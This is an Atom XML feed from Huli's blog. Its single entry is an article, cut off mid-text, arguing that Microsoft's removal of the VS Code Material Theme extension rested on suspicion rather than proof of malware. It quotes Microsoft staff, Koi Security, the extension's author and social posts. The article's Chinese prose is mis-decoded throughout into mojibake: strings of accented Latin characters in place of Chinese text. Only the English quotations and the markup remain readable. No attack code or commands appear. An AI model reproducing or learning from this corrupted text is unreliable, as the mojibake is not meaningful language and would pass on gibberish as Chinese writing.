<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Huli&#39;s blog</title>
  
  <subtitle>Learning by sharing</subtitle>
  <link href="https://blog.huli.tw/atom.xml" rel="self"/>
  
  <link href="https://blog.huli.tw/"/>
  <updated>2025-03-16T09:15:12.854Z</updated>
  <id>https://blog.huli.tw/</id>
  
  <author>
    <name>Huli</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>VS Code Material Theme ä¸æ˜¯æƒ¡æ„è»Ÿé«”â€”â€”å®‰å…¨çš„ç·šè©²ç•«åœ¨å“ªï¼Ÿ</title>
    <link href="https://blog.huli.tw/2025/03/16/vscode-material-theme-is-not-a-malware/"/>
    <id>https://blog.huli.tw/2025/03/16/vscode-material-theme-is-not-a-malware/</id>
    <published>2025-03-16T02:40:00.000Z</published>
    <updated>2025-03-16T09:15:12.854Z</updated>
    
    <content type="html"><![CDATA[<p>æ‡‰è©²ä¸å°‘äººéƒ½æœ‰è·Ÿåˆ°ä¸‰é€±å‰ VS Code ä¸Šçš„çŸ¥åå¥—ä»¶ Material Theme è¢«å¾®è»Ÿä¸»å‹•ä¸‹æ¶çš„æ–°èï¼Œé‚£ä¸‹æ¶çš„ç†ç”±æ˜¯ä»€éº¼å‘¢ï¼Ÿæ ¹æ“šä½ å¾—çŸ¥é€™ä»¶äº‹çš„æ¶ˆæ¯ä¾†æºä»¥åŠè‡ªèº«å€‹æ€§ï¼Œå¯èƒ½æœƒæœ‰å…©ç¨®å›ç­”ï¼š</p><ol><li>å®ƒã€Œç–‘ä¼¼ã€å«æœ‰æƒ¡æ„ç¨‹å¼ç¢¼</li><li>å®ƒå°±æ˜¯å€‹æƒ¡æ„è»Ÿé«”</li></ol><p>ç‚ºä»€éº¼è·Ÿè‡ªèº«å€‹æ€§æœ‰é—œå‘¢ï¼Ÿå› ç‚ºå°±ç®—æ¶ˆæ¯ä¾†æºæ¥æ”¶åˆ°çš„æ˜¯ç¬¬ä¸€ç¨®ï¼Œåœ¨ç¨®ç¨®æ¢ä»¶çš„äº’ç›¸åŠ æŒå½±éŸ¿ä¹‹ä¸‹ï¼Œä½ ä¹Ÿå¾ˆæœ‰å¯èƒ½è§£é‡‹æˆç¬¬äºŒç¨®ã€‚</p><span id="more"></span><p>ä»¥å°ç£çš„æ¶ˆæ¯ä¾†æºä¾†èªªï¼Œæœ€å¤šäººçœ‹åˆ°çš„æ‡‰è©²æ˜¯ä¿å“¥çš„é€™ç¯‡<a href="https://www.facebook.com/story.php?story_fbid=1060924756061613&id=100064322940906&_rdr">è‡‰æ›¸è²¼æ–‡</a>ï¼Œå…§æ–‡å¯«è‘—ï¼š</p><blockquote><p>å¾®è»Ÿç·Šæ€¥ä¸‹æ¶æ“æœ‰ 900 è¬æ¬¡ä¸‹è¼‰çš„çŸ¥å Material Theme Icons èˆ‡ Material Theme Free æ“´å……å¥—ä»¶ï¼Œé€™äº›çœ‹ä¼¼ç„¡å®³çš„ä½ˆæ™¯ä¸»é¡Œæ“´å……è¢«ç™¼ç¾æš—è—é«˜åº¦æ··æ·†çš„æƒ¡æ„ä»£ç¢¼ï¼Œå¯èƒ½å°è‡´å¤§è¦æ¨¡é–‹ç™¼è€…å¸³æˆ¶è³‡æ–™å¤–æ´©ï¼</p><p>ğŸ”¥<br>äº‹ä»¶é—œéµé»ï¼š<br>1ï¸âƒ£ ç¶²è·¯å®‰å…¨ç ”ç©¶å“¡ Amit Assaraf åœ˜éšŠåœ¨ä¾‹è¡Œæƒæä¸­ç™¼ç¾ï¼Œé€™äº›ä¸»é¡Œæ“´å±•ä¸­çš„ release-notes.js æª”æ¡ˆå­˜åœ¨å¤§é‡æ··æ·†éçš„ JavaScript ç¨‹å¼ï¼Œå…¶ä¸­åŒ…å«å°ä½¿ç”¨è€…åç¨±ã€å¯†ç¢¼ç­‰æ•æ„Ÿè³‡è¨Šçš„å­˜å–ã€‚</p><p>2ï¸âƒ£ å°ˆå®¶æ¨æ¸¬é€™å¯èƒ½æ˜¯é€é 2023 å¹´æŸæ¬¡æ›´æ–°æ¤å…¥çš„ä¾›æ‡‰éˆæ”»æ“Šï¼Œæˆ–é–‹ç™¼è€…å¸³è™Ÿé­é»‘å®¢åŠ«æŒæ‰€è‡´ã€‚</p><p>å¾®è»Ÿä¸åƒ…ä¸‹æ¶äº†æ‰€æœ‰ç›¸é—œæ“´å……å¥—ä»¶ï¼Œé‚„ç›´æ¥å°é–äº†é–‹ç™¼è€… Mattia Astorino (equinusocio) çš„å¸³è™Ÿï¼Œä¸¦å¼·åˆ¶å¸è¼‰å…¨çƒä½¿ç”¨è€…ç«¯å·²å®‰è£çš„æ“´å……å¥—ä»¶ã€‚é€™æ˜¯ VS Marketplace è¿‘ä¸‰å¹´ä¾†æœ€å¤§è¦æ¨¡çš„å®‰å…¨æ¸…ç†è¡Œå‹•ï¼ğŸ‘</p><p>é™„ä»¶é€£çµæ˜¯ GitHub Issues è¨è«–ï¼Œéå¸¸ç†±é¬§ï¼Œæ„›åƒç“œçš„é„‰æ°‘å¿«å»æœè–å•Šï¼ğŸ‘¨â€ğŸ’»<br>#é‚„å¥½æˆ‘ä¸æ„›Material #ä¾›æ‡‰éˆæ”»æ“Š #è¨˜å¾—VSCodeé€£ç¶²å‡ç´šä¸€ä¸‹</p></blockquote><p>å…§æ–‡å¯«äº†ã€Œè¢«ç™¼ç¾æš—è—é«˜åº¦æ··æ·†çš„æƒ¡æ„ä»£ç¢¼ã€ï¼Œç›´æ¥èªå®šæ˜¯æƒ¡æ„è»Ÿé«”äº†ã€‚å†åŠ ä¸Šæ–‡ä¸­é™„ä¸Šçš„å…¶ä»–è­‰æ“šï¼Œæ··æ·†éçš„ç¨‹å¼ç¢¼ä»¥åŠå°æ•æ„Ÿè³‡è¨Šçš„å­˜å–ç­‰ç­‰ï¼Œé‚„ä¸»å‹•è¢«å¾®è»Ÿä¸‹æ¶ï¼Œä¸è¦ºå¾—æ˜¯æƒ¡æ„è»Ÿé«”éƒ½é›£ã€‚</p><p>è€Œåº•ä¸‹ç•™è¨€é™„çš„è³‡å®‰äººå ±å°<a href="https://www.informationsecurity.com.tw/article/article_detail.aspx?aid=11684">ã€Šè³‡å®‰é¢¨éšªï¼å¾®è»Ÿç¦ä¸‹è¼‰é‡é”900è¬æ¬¡çš„VSCode Material Themeæ“´å……å¥—ä»¶ã€‹</a> ä¸­ï¼Œå¯«çš„å°±ç›¸å°ä¿å®ˆä¸€é»ï¼š</p><blockquote><p>å¾®è»Ÿè¿‘æ—¥å¾Visual Studio Marketplaceä¸­ç§»é™¤äº†å…©å€‹å»£å—æ­¡è¿çš„VSCodeæ“´å……å¥—ä»¶ï¼šã€ŒMaterial Theme â€“ Freeã€å’Œã€ŒMaterial Theme Icons â€“ Freeã€ï¼ŒåŸå› æ˜¯é€™äº›æ“´å……å¥—ä»¶è¢«ç™¼ç¾å¯èƒ½åŒ…å«æƒ¡æ„ç¨‹å¼ç¢¼ã€‚</p></blockquote><p>ç”¨çš„å­—çœ¼æ˜¯ã€Œå¯èƒ½åŒ…å«æƒ¡æ„ç¨‹å¼ç¢¼ã€ï¼Œå°±æ˜¯æˆ‘æ‰€èªªçš„ç¬¬ä¸€ç¨®ã€‚ä½†èˆ‡ä¸Šé¢çš„è²¼æ–‡é¡ä¼¼ï¼Œå ±å°ä¸­é‚„èªªæ˜æœ‰è³‡å®‰åœ˜éšŠç™¼ç¾äº†å¯ç–‘çš„ç¨‹å¼ç¢¼ï¼Œåˆæ··æ·†åˆè·Ÿå¸³è™Ÿå¯†ç¢¼æœ‰é—œã€‚å› æ­¤ï¼Œå„˜ç®¡å ±å°æœ¬èº«ä¸¦æ²’æœ‰æ˜ç¢ºå¯«å‡ºå®ƒå°±æ˜¯å€‹æƒ¡æ„è»Ÿé«”ï¼Œåªæœ‰å¯«ã€Œå¯èƒ½åŒ…å«æƒ¡æ„ç¨‹å¼ç¢¼ã€ï¼Œåœ¨å…¶ä»–è­‰æ“šçš„åŠ æŒä¸‹ï¼Œä½ æˆ–è¨±ä¹Ÿæœƒèªç‚ºå®ƒå°±æ˜¯å€‹æƒ¡æ„è»Ÿé«”ã€‚</p><p>é™¤äº†é€™äº›ï¼Œè¨€ä¹‹é‘¿é‘¿èªª Material Theme å°±æ˜¯å€‹æƒ¡æ„è»Ÿé«”çš„æ–°èæˆ–æ˜¯æ¨æ–‡ä¹Ÿéƒ½é‚„æœ‰å¾ˆå¤šï¼Œä¾‹å¦‚èªª 20 è¬äººè¿½è¹¤çš„ <a href="https://x.com/theo/status/1894661673388314710">@theo</a> å°±ç›´æ¥èªªäº†ï¼š</p><blockquote><p>The Material Theme has just been removed from GitHub and VS Code due to shipping malware</p></blockquote><p>é‚£åˆ°åº• VS Code ä¸Šçš„ Material Theme æ“´å……å¥—ä»¶æ˜¯ä¸æ˜¯æƒ¡æ„è»Ÿé«”å‘¢ï¼Ÿå…ˆè¬›çµè«–ï¼šã€Œä¸æ˜¯ã€ã€‚</p><p>é‚£é€™æ•´ä»¶äº‹æƒ…çš„éç¨‹åˆ°åº•æ˜¯å¦‚ä½•ï¼Ÿç‚ºä»€éº¼ä¸€é–‹å§‹èªªç–‘ä¼¼æ˜¯æƒ¡æ„è»Ÿé«”ï¼Œå¾Œä¾†åˆä¸æ˜¯äº†ï¼Ÿæˆ‘å€‘æŒ‰ç…§æ™‚é–“é †åºï¼Œå…ˆå¾é–‹é ­ä¾†èŠèŠå§ã€‚</p><h2><span id="äº‹æƒ…çš„é–‹ç«¯èˆ‡ä¸‹æ¶çš„ç†ç”±">äº‹æƒ…çš„é–‹ç«¯èˆ‡ä¸‹æ¶çš„ç†ç”±</span></h2><p>ï¼ˆåº•ä¸‹æ™‚é–“éƒ½æ˜¯æŒ‡å°ç£æ™‚é–“ï¼‰</p><p>2025&#x2F;02&#x2F;26 å‡Œæ™¨ 01:32ï¼Œæœ‰äººåœ¨ Material Theme çš„ GitHub ä¸Šç™¼äº†ä¸€å€‹ issueï¼š<a href="https://web.archive.org/web/20250226020241/https://github.com/material-theme/vsc-material-theme/discussions/1313">This extension was reported to be problematic</a>ï¼Œå…§æ–‡ä¸­æåˆ°åœ¨ VS Code ä¸­æœƒå‡ºç¾åº•ä¸‹çš„æç¤ºï¼š</p><blockquote><p>We have uninstalled â€˜equinusocio.vsc-material-themeâ€™ which was reported to be problematic.</p></blockquote><p>è­‰æ˜è‡³å°‘åœ¨é€™å€‹æ™‚é–“é»ï¼Œå¾®è»Ÿå·²ç¶“ä¸»å‹•æŠŠ VS Code ä¸­çš„ Material theme ç§»é™¤ã€‚éäº†å¹¾å€‹å°æ™‚ï¼Œåœ¨ 04:39 æ™‚ï¼ŒçŸ¥åçš„è¨è«–å€ reddit ä¸­ä¹Ÿæœ‰äººç™¼æ–‡è¨è«–ç›¸åŒçš„ç‹€æ³ï¼š<a href="https://www.reddit.com/r/vscode/comments/1iy571t/comment/meuooi1/">Lost Material Theme</a>ã€‚</p><p>åˆ°äº†æ—©ä¸Š 7 é»ï¼ŒHacker News ä¸Šä¹Ÿé–‹å§‹æœ‰äººè¨è«–ï¼š<a href="https://news.ycombinator.com/item?id=43178831">Material Theme has been pulled from VS Codeâ€™s marketplace </a>ã€‚</p><p>å¤§ç´„ä¸‹åˆ 3 é» 40 åˆ†çš„æ™‚å€™ï¼ŒVS Code çš„åœ˜éšŠæˆå“¡ Isidor å‡ºä¾†å›è¦†äº†ï¼š</p><blockquote><p>Hi - Isidor here from the VS Code team.<br>A member of the community did a deep security analysis of the extension and found multiple red flags that indicate malicious intent and reported this to us. Our security researchers at Microsoft confirmed this claims and found additional suspicious code.</p><p>We banned the publisher from the VS Marketplace and removed all of their extensions and uninstalled from all VS Code instances that have this extension running. For clarity - the removal had nothing to do about copyright&#x2F;licenses, only about potential malicious intent.</p><p>Expect an announcement here with more details soon <a href="https://github.com/microsoft/vsmarketplace/">https://github.com/microsoft/vsmarketplace/</a></p><p>As a reminder, the VS Marketplace continuously invests in security. And more about extension runtime trust can be found in this article <a href="https://code.visualstudio.com/docs/editor/extension-runtime-security">https://code.visualstudio.com/docs/editor/extension-runtime-security</a></p><p>Thank you!</p></blockquote><p>å¤§æ„å°±æ˜¯ç¤¾ç¾¤ä¸­æœ‰äººå°é€™å€‹å¥—ä»¶åšäº†æ·±åº¦çš„è³‡å®‰åˆ†æï¼Œæ‰¾åˆ°äº†å¤šå€‹ red flags æŒ‡å‡ºé€™å€‹å¥—ä»¶å…·æœ‰æƒ¡æ„çš„æ„åœ–ä¸¦å‘å¾®è»Ÿå›å ±ï¼Œè€Œå¾®è»Ÿå…§éƒ¨çš„è³‡å®‰ç ”ç©¶å“¡ä¹Ÿç¢ºèªäº†é€™å€‹ç™¼ç¾ï¼Œä¸¦æ‰¾å‡ºå…¶ä»–å¯ç–‘çš„ç¨‹å¼ç¢¼ã€‚å¾®è»Ÿå·²ç¶“æŠŠé€™å€‹é–‹ç™¼è€…çš„å¥—ä»¶éƒ½ä¸‹æ¶ä»¥åŠæŠŠä»– ban æ‰ï¼Œä¸¦èªªæ˜é€™æ¬¡ç§»é™¤å¥—ä»¶çš„è¡Œç‚ºèˆ‡ license ç„¡é—œï¼ˆé€™æˆ‘å€‘ç­‰ç­‰è«‡ï¼‰ï¼Œåªè·Ÿæ½›åœ¨çš„å¯ç–‘æ„åœ–æœ‰é—œã€‚</p><p>åˆ°äº†æ™šä¸Š 11 é»ï¼Œæœ‰äººåœ¨ Visual Studio Marketplace çš„ GitHub ä¸­é–‹äº†ä¸€å€‹ issue è¨è«–é€™ä»¶äº‹ï¼š<a href="https://github.com/microsoft/vsmarketplace/issues/1168">Material theme compromised?</a>ï¼Œæƒ³çŸ¥é“æ›´å¤šçš„ç´°ç¯€ã€‚</p><p>è€Œ VS Code Marketplace çš„ PM seaniyer ä¹Ÿåœ¨ 2&#x2F;27 æ—©ä¸Š 9 é» 57 çš„æ™‚å€™çµ¦å‡ºäº†<a href="https://github.com/microsoft/vsmarketplace/issues/1168#issuecomment-2686542068">å›è¦†</a>ï¼š</p><blockquote><p>Sean here from VS Code Marketplace. We take the decision to remove seriously and thoroughly verify any reports. To protect developers, we also prioritize speedy removal of positives. Weâ€™ve posted the reason for removal in RemovedPackages, where we plan to add any future removals as well. Thanks for helping to keep the marketplace safe for everyone.<br>æˆ‘å€‘å°ç§»é™¤æ±ºç­–æŒè¬¹æ…æ…‹åº¦ï¼Œä¸¦æœƒå¾¹åº•é©—è­‰æ‰€æœ‰èˆ‰å ±ã€‚ç‚ºäº†ä¿è­·é–‹ç™¼è€…ï¼Œæˆ‘å€‘ä¹Ÿå„ªå…ˆè¿…é€Ÿç§»é™¤ç¢ºå®šå­˜åœ¨å•é¡Œçš„é …ç›®ã€‚æˆ‘å€‘å·²åœ¨ RemovedPackages ä¸­ç™¼å¸ƒäº†ç§»é™¤åŸå› ï¼Œä¸¦è¨ˆåŠƒæœªä¾†å°‡æ‰€æœ‰ç§»é™¤è¨˜éŒ„çµ±ä¸€ç™¼å¸ƒåœ¨è©²è™•ã€‚</p></blockquote><p><a href="https://github.com/microsoft/vsmarketplace/commit/5d23236b873a96d0da5dc90990e6172341c88b71">RemovedPackages.md</a> é€™å€‹æª”æ¡ˆæ˜¯åœ¨ç•¶å¤©æ—©ä¸Š 7 é»æ‰è¢«å»ºç«‹çš„ï¼Œæˆ–è¨±ä»£è¡¨é€™æ˜¯å¾®è»Ÿç¬¬ä¸€æ¬¡ä¸»å‹•æŠŠå¥—ä»¶ä¸‹æ¶ï¼Ÿ</p><p>åœ¨æ–‡ä»¶ä¸­å¯«äº†è¢«ä¸‹æ¶çš„å¥—ä»¶æ˜¯ Equinusocio.vsc-material-theme-iconsï¼ˆå¦ä¸€å€‹ç›¸åŒä½œè€…çš„å¥—ä»¶ï¼Œä»–æœ‰å…©å€‹ï¼Œä¸€å€‹æ˜¯ Material Theme å¦ä¸€å€‹æ˜¯ Material Theme Iconsï¼‰ï¼Œç†ç”±æ˜¯ï¼š</p><blockquote><p>A theming extension with heavily obfuscated code and unreasonable dependencies including a utility for running child processes<br>ä¸€å€‹ä¸»é¡Œæ“´å……åŠŸèƒ½ï¼Œå…¶ç¨‹å¼ç¢¼ç¶“éé«˜åº¦æ··æ·†ï¼Œä¸¦åŒ…å«ä¸åˆç†çš„ä¾è³´é …ï¼Œä¾‹å¦‚ç”¨æ–¼åŸ·è¡Œ child process çš„ utilityã€‚</p></blockquote><p>è€Œæœ‰ä¸€é–“è³‡å®‰å…¬å¸ Koi Securityï¼Œåœ¨ 2025&#x2F;02&#x2F;27 ç™¼å¸ƒäº†æ–‡ç«  <a href="https://blog.koi.security/a-wolf-in-dark-mode-the-malicious-vs-code-theme-that-fooled-millions-85ed92b4bd26">A Wolf in Dark Mode: The Malicious VS Code Theme That Fooled Millions</a>ï¼Œæåˆ°äº†ä»–å€‘åœ¨ Material Theme ä¸­æ‰¾åˆ°æƒ¡æ„ç¨‹å¼ç¢¼ï¼Œçœ‹èµ·ä¾†æ˜¯ç¶“ç”±ä¸€å€‹ dependency æ‰€å¼•å…¥çš„ï¼š</p><blockquote><p>Say hello to the wolf in dark mode, â€œMaterial Themeâ€, an extremely popular VSCode theme extension, found to be containing malware underneath itâ€™s beautiful color scheme</p><p>Material Theme â€” Free, a theme extension for VSCode, which was installed 3,927,094 times by developers, was found to contain malicious code through a dependency</p><p>The malicious code seems to be inside a dependency of the theme, which was compromised.</p></blockquote><p>é€™è£¡ç”¨çš„è©æ˜¯ã€Œwas found to contain malicious codeã€ï¼Œä¹Ÿæ˜¯ç›´æ¥èªªäº†åŒ…å«æƒ¡æ„ç¨‹å¼ç¢¼ã€‚</p><h2><span id="ä½œè€…çš„åé§">ä½œè€…çš„åé§</span></h2><p>2&#x2F;28 å°‡è¿‘ä¸‹åˆ 5 é»ï¼ŒMaterial Theme çš„ä½œè€… @equinusocio åœ¨ Visual Studio Marketplace çš„ GitHub ä¸­é–‹äº†å€‹ issueï¼š<a href="https://github.com/microsoft/vsmarketplace/issues/1173">Asking for Equinusocio publisher restoration and relative extensions, censorship and shady discriminatory microsoft moves</a>ï¼Œå¤§æ„å°±æ˜¯èªªå®ƒçš„å¥—ä»¶è£¡é¢æ²’æœ‰æƒ¡æ„ç¨‹å¼ç¢¼ï¼Œå”¯ä¸€æœ‰çš„å•é¡Œæ˜¯ä¸€å€‹å¤ªèˆŠçš„ç¬¬ä¸‰æ–¹å¥—ä»¶ï¼š</p><blockquote><p>This decision destroyed 10 years of reputation and trust, all based on unfounded SUSPICIONS regarding obfuscated codeâ€”something you dislike, even though there was no evidence of harm. The only issue was an outdated sanity.io dependency within the obfuscated code, which could have been fixed in 30 seconds.<br>é€™å€‹æ±ºå®šæ¯€æ‰äº† 10 å¹´ä¾†çš„è²è­½å’Œä¿¡ä»»ï¼Œè€Œé€™ä¸€åˆ‡éƒ½åŸºæ–¼å°æ··æ·†ç¨‹å¼ç¢¼æ¯«ç„¡æ ¹æ“šçš„æ‡·ç–‘â€”â€”åªæ˜¯å› ç‚ºä½ ä¸å–œæ­¡å®ƒï¼Œå„˜ç®¡ä¸¦æ²’æœ‰ä»»ä½•å±å®³çš„è­‰æ“šã€‚å”¯ä¸€çš„å•é¡Œæ˜¯æ··æ·†ç¨‹å¼ç¢¼ä¸­å­˜åœ¨ä¸€å€‹éæ™‚çš„ sanity.io ä¾è³´ï¼Œè€Œé€™æœ¬å¯ä»¥åœ¨ 30 ç§’å…§ä¿®å¾©ã€‚</p></blockquote><p>æ–‡æœ«ä¹Ÿæåˆ°å¦‚æœç¢ºèªä»–çš„å¥—ä»¶æ²’æœ‰æƒ¡æ„ç¨‹å¼ç¢¼ï¼Œè«‹æ¢å¾©æ‰€æœ‰çš„ extensions ä»¥åŠå…¬é–‹é“æ­‰ï¼š</p><blockquote><p>If your review of MY SOURCE CODE confirms that there is nothing malicious, I formally request the full restoration of our publisher accounts (Equinusocio and vira-theme), all related extensions, and user access to the theme. Additionally, all installations and insights should be reinstated.</p></blockquote><h2><span id="material-theme-ç‚ºä»€éº¼æœƒè¢«æ‡·ç–‘">Material Theme ç‚ºä»€éº¼æœƒè¢«æ‡·ç–‘ï¼Ÿ</span></h2><p>æ•´ç†ä¸€ä¸‹ä¸Šé¢çš„è«–è¿°ï¼Œæœƒç™¼ç¾ Material Theme ç¢ºå¯¦å¹¹äº†é€™éº¼å¹¾ä»¶äº‹æƒ…ï¼š</p><ol><li>æ˜æ˜æ˜¯å€‹ themeï¼Œä½†å¥—ä»¶è£¡æœ‰ JavaScript</li><li>å…·æœ‰æ··æ·†éçš„ç¨‹å¼ç¢¼</li><li>ç¨‹å¼ç¢¼ä¸­æœ‰èˆ‡ username è·Ÿ password æœ‰é—œçš„éƒ¨åˆ†</li><li>å«æœ‰æ‹¿ä¾†åŸ·è¡Œ child processes çš„ utility</li></ol><p>ä½ å•æˆ‘å¯ä¸å¯ç–‘ï¼Œå¯ç–‘å•Šï¼Œç•¶ç„¶å¯ç–‘ã€‚ä½†å¦‚æœä½ å•æˆ‘å®ƒæ˜¯ä¸æ˜¯æƒ¡æ„ç¨‹å¼ï¼Œæˆ‘æœƒèªªä¸æ˜¯ã€‚</p><p>ç‚ºä»€éº¼ä¸æ˜¯ï¼Ÿå› ç‚ºæ²’æœ‰äººçµ¦å‡ºè­‰æ“šå•Šã€‚å„˜ç®¡æŠŠç¨‹å¼ç¢¼æ··æ·†ç¢ºå¯¦å¯ç–‘ï¼Œä½†ä¹Ÿå°±åªæ˜¯å¯ç–‘è€Œå·²ã€‚æ›´ä½•æ³é€™å€‹ã€Œå¯ç–‘ã€çš„åŠ›åº¦åœ¨æˆ‘çœ‹ä¾†ä¸¦æ²’æœ‰é€™éº¼å¼·ã€‚èˆ‰ä¾‹ä¾†è¬›ï¼Œæ²’æœ‰æ‰¾åˆ°è·Ÿæƒ¡æ„ server é€šä¿¡çš„è­‰æ“šæˆ–æ˜¯å¯ç–‘çš„å¾Œé–€ç­‰ç­‰ã€‚</p><p>é™¤æ­¤ä¹‹å¤–ï¼Œé—œæ–¼æ··æ·†é€™é»ï¼Œå¦‚æœæœ‰äº†è§£éæƒ…æ³çš„è©±ï¼Œå°±æœƒç™¼ç¾æ—©åœ¨ 2024 å¹´ 8 æœˆï¼ŒReddit ä¸Šå°±æœ‰äººç™¼äº†ä¸€ç¯‡ <a href="https://www.reddit.com/r/vscode/comments/1eq40o2/has_the_material_theme_extension_been_compromised/?rdt=47469">Has the Material Theme extension been compromised?</a>ï¼Œèªªæœ€æ–°çš„ç‰ˆæœ¬å«æœ‰å¤§é‡æ··æ·†éçš„ç¨‹å¼ç¢¼ï¼ŒGitHub ä¸Šçš„æ­·å²ç´€éŒ„ä¹Ÿå·²ç¶“è¢«åˆªé™¤ï¼Œå•èªªæ˜¯ç™¼ç”Ÿä»€éº¼äº‹äº†ã€‚</p><p>æœ‰äººèªªå¯èƒ½è·Ÿä½œè€…åœ¨ 8&#x2F;10 ç™¼èµ·çš„é€™å…©å€‹è¨è«–æœ‰é—œï¼š</p><ol><li><a href="https://web.archive.org/web/20241230012548/https://github.com/material-theme/vsc-material-theme/discussions/1304">âš ï¸ Looking for Typescript maintainer âš ï¸ </a></li><li><a href="https://web.archive.org/web/20241230040357/https://github.com/material-theme/vsc-material-theme/discussions/1305">Premium extensions</a></li></ol><p>å› ç‚ºä½œè€…æƒ³æŠŠé€™å€‹å¥—ä»¶å¾é–‹æºè®Šæˆé–‰æºï¼Œä¸¦ä¸”ç™¼å±•æ”¶è²»ç‰ˆï¼Œå› æ­¤æ‰ç”¨æ··æ·†çš„æ–¹å¼æŠŠä¸€äº›é‚è¼¯è—èµ·ä¾†ã€‚</p><p>è€Œæ‰€è¬‚çš„ã€Œç¨‹å¼ç¢¼ä¸­æœ‰èˆ‡ username è·Ÿ password æœ‰é—œçš„éƒ¨åˆ†ã€ï¼Œä¹Ÿå¾ˆå¯èƒ½æ˜¯å› ç‚ºæŸå€‹ç¬¬ä¸‰æ–¹å¥—ä»¶ä½¿ç”¨äº† <a href="https://github.com/unshiftio/url-parse">url-parser</a>ï¼Œå› æ­¤é€™äº›å¸³è™Ÿå¯†ç¢¼æŒ‡çš„æ˜¯åœ¨è§£æ URL æ™‚ç¶²å€ä¸Šçš„å¸³è™Ÿå¯†ç¢¼ï¼Œè€Œä¸æ˜¯ä»€éº¼å·å–ä½ é›»è…¦ä¸­çš„æ•æ„Ÿè³‡è¨Šã€‚</p><p>è‡³æ–¼ã€Œæ‹¿ä¾†åŸ·è¡Œ child processes çš„ utilityã€ï¼Œ<a href="https://github.com/microsoft/vsmarketplace/issues/1173#issuecomment-2693242277">æœ‰äºº</a>æŠŠç¨‹å¼ç¢¼åæ··æ·†ä¹‹å¾Œä¾†çœ‹ï¼Œå°±åªæ˜¯å€‹ build scriptï¼Œæ²’æœ‰åŸ·è¡Œä»»ä½•æƒ¡æ„æŒ‡ä»¤ã€‚</p><p>ï¼ˆè©±èªªä¸Šé¢é€™å…©é»æˆ‘æ²’æœ‰è¦ªè‡ªé©—è­‰ï¼Œæ“´å……å¥—ä»¶çš„åŸå§‹ç¢¼ä¸€ç›´éƒ½å¯ä»¥ä¸‹è¼‰ï¼Œæœ‰èˆˆè¶£çš„äººå¯ä»¥è¦ªè‡ªçœ‹çœ‹ï¼š<a href="https://marketplace.visualstudio.com/_apis/public/gallery/publishers/Equinusocio/vsextensions/vsc-material-theme/34.7.9/vspackage">https://marketplace.visualstudio.com/_apis/public/gallery/publishers/Equinusocio/vsextensions/vsc-material-theme/34.7.9/vspackage</a> ï¼‰</p><p>è€Œ Koi Security çš„é‚£ç¯‡æ–‡ç« ä¹Ÿå®Œå…¨æ²’æœ‰ä»»ä½•æ˜ç¢ºè­‰æ“šï¼Œé€™é‚Šæˆ‘çš„ç«‹å ´è·Ÿ <a href="https://andrews.substack.com/p/re-vscode-extension-drama">RE: VSCode Extension Drama</a> é€™ç¯‡æ–‡ç« çš„å‰¯æ¨™é¡Œä¸€æ¨£ï¼šYou canâ€™t run your threat response like a High School cliqueã€‚</p><p>ç•¶ç„¶ï¼Œå…ˆæ’‡é™¤ Material Theme ä¸è«‡ï¼Œé€™å€‹ä½œè€…æœ¬èº«åŸæœ¬å°±æœ‰ä¸å°‘ä¸ç¬¦åˆé–‹æºç²¾ç¥çš„è¡Œç‚ºï¼Œé€™ä¹Ÿæ˜¯ç‚ºä»€éº¼å‰é¢æåˆ°çš„å¾®è»Ÿè²æ˜ä¸­ï¼Œæœƒèªªï¼šã€ŒFor clarity - the removal had nothing to do about copyright&#x2F;licenses, only about potential malicious intent.ã€ï¼Œä½†å› ç‚ºé€™äº›éƒ½è·Ÿæ“´å……å¥—ä»¶æ˜¯å¦ç‚ºæƒ¡æ„è»Ÿé«”é€™ä»¶äº‹ç„¡é—œï¼Œæ‰€ä»¥é€™é‚Šå°±ä¸å¤šè«‡äº†ã€‚</p><p>è€Œä¸€é–‹å§‹æ‡‰è©²æ˜¯åªæœ‰ Material Theme è·Ÿ Material Theme Icons è¢«ä¸‹æ¶ä¸”ç§»é™¤ï¼Œä½†ä¹‹å¾Œä½œè€…é–‹äº†æ–°å¸³è™Ÿæ”¹ååˆå‚³äº†ä¸€æ¬¡ï¼Œè¢«ç™¼ç¾å¤šæ¬¡å¾Œæ•´å€‹å¸³è™Ÿè¢« ban æ‰ï¼Œé€™å€‹å¾ reddit çš„<a href="https://www.reddit.com/r/vscode/comments/1iy571t/comment/meuooi1/">è¨è«–ä¸²</a>ä¸­å¯ä»¥çœ‹å‡ºä¾†ã€‚</p><p>ç¸½ä¹‹å‘¢ï¼Œé€™å€‹<a href="https://github.com/microsoft/vsmarketplace/issues/1173#issuecomment-2692845250"> @r8 çš„è©•è«–</a>æ»¿ç²¾æº–åœ°èªªå‡ºæˆ‘çš„æƒ³æ³•ï¼š</p><blockquote><p>Being an ass is not a crime. If you want to ban Mattia for being an ass (which, Iâ€™m sorry to say, he is), thatâ€™s what Codes of Conduct were invented for.</p></blockquote><h2><span id="ç–‘ä¼¼èˆ‡ç¢ºå¯¦é‡è¦çš„ä¸€ç·šä¹‹éš”">ã€Œç–‘ä¼¼ã€èˆ‡ã€Œç¢ºå¯¦ã€ï¼Œé‡è¦çš„ä¸€ç·šä¹‹éš”</span></h2><p>æˆ‘æƒ³è¨è«–çš„å•é¡Œæ˜¯ï¼šã€ŒVS Code åœ˜éšŠä¸‹æ¶ Material Theme å¥—ä»¶æ˜¯å¦åˆç†ï¼Ÿã€</p><p>ä½†å› ç‚ºé€™å€‹å•é¡ŒèƒŒå¾Œå…¶å¯¦è—è‘—å…©ä¸‰å€‹å­å•é¡Œï¼Œå› æ­¤æˆ‘æ±ºå®šå…ˆæŠŠå•é¡Œåˆ‡å°ï¼Œç¬¬ä¸€ä»¶å¯ä»¥ä¾†èŠçš„äº‹æƒ…æ˜¯ï¼Œç•¶ç™¼ç¾ã€Œç–‘ä¼¼å«æœ‰æƒ¡æ„ç¨‹å¼ç¢¼ã€çš„å¥—ä»¶æ™‚ï¼ŒæŠŠå®ƒä¸‹æ¶æ˜¯å¦åˆç†ï¼Ÿ</p><p>é 